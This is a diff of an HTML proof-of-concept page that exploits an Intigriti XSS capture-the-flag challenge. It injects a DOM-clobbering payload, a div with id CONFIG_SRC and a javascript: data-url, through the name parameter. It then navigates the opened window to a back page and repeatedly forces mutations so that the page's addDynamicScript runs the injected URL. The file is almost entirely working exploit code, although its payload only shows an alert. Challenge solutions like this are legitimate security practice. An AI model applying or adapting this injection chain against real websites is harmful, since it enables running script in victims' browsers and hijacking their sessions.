@@ -2,38 +2,32 @@
 <html>
 <body>
 <script>
-    const targetUrl = "https://challenge-0525.intigriti.io/begin?name=%3C%2Fstrong%3E%3Cdiv%20id%3Dstrong%3E%3C%2Fdiv%3E%3Cdiv%20id%3DCONFIG_SRC%20data-url%3Djavascript:alert(document.domain)%3Etest%3C%2Fdiv%3E%3Cstrong%3Ea";
+    const payload = `</strong><div id=strong></div><div id=CONFIG_SRC data-url=javascript:alert(document.domain)>test</div><marquee>Trigger Mutation</marquee><details open><summary>Click Me</summary>x`;
+
+    const targetUrl = `https://challenge-0525.intigriti.io/begin?name=${encodeURIComponent(payload)}`;
     const backUrl = "https://pedrojuniorrd.github.io/_layouts/back.html?n=1";
 
     const w = window.open(targetUrl);
 
-    function tryTrigger() {
-        try {
-            if (w.document && w.CONFIG_SRC && typeof w.addDynamicScript === "function") {
-                console.log("✅ Triggering addDynamicScript...");
-                w.addDynamicScript();
-                observer.disconnect();
-                clearInterval(proactive);
-            }
-        } catch (e) {}
-    }
-
-    const observer = new MutationObserver(tryTrigger);
-
     setTimeout(() => {
-        try {
-            w.location = backUrl;
-            w.addEventListener('DOMContentLoaded', () => {
-                const doc = w.document;
-                if (doc) {
-                    observer.observe(doc, { childList: true, subtree: true });
-                }
-            });
+        try { 
+            w.location = backUrl; 
         } catch (e) {}
     }, 3000);
 
     const proactive = setInterval(() => {
-        tryTrigger();
+        try {
+            // Tentativa direta
+            if (w.document && w.CONFIG_SRC && typeof w.addDynamicScript === "function") {
+                w.addDynamicScript();
+                clearInterval(proactive);
+            } else if (w.document?.getElementById('message')) {
+                // Forçar mutação nativa
+                const newNode = w.document.createElement('div');
+                newNode.innerText = "Forced Mutation";
+                w.document.getElementById('message').appendChild(newNode);
+            }
+        } catch (e) {}
     }, 1000);
 </script>
 </body>
